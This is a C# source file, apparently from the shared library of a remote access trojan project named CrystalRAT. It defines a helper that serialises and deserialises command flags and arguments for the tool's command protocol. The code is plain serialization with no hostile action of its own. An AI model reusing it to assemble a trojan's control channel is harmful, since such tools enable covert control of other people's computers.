using CrystalRATShared.Commands;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CrystalRATShared.Serialization
{
    public static class CommandDataSerializer
    {
        public delegate void SerializeArguments(BinaryWriter writer);
        public delegate void CommandHandler(CommandFlags flag, BinaryReader reader);

        public static byte[] Serialize(CommandFlags flag, SerializeArguments args)
        {
            byte[] data;

            using (MemoryStream ms = new MemoryStream())
            {
                using (BinaryWriter writer = new BinaryWriter(ms))
                {
                    writer.Write((int)flag);
                    args(writer);
                }

                data = ms.ToArray();
            }

            return data;
        }

        public static CommandFlags Deserialize(byte[] input, CommandHandler handler)
        {

            CommandFlags flag;

            using (MemoryStream ms = new MemoryStream(input))
            {
                using (BinaryReader reader = new BinaryReader(ms))
                {

                    flag = (CommandFlags)reader.ReadInt32();
                    handler(flag, reader);
                }
            }

            return flag;
        }



    }
}
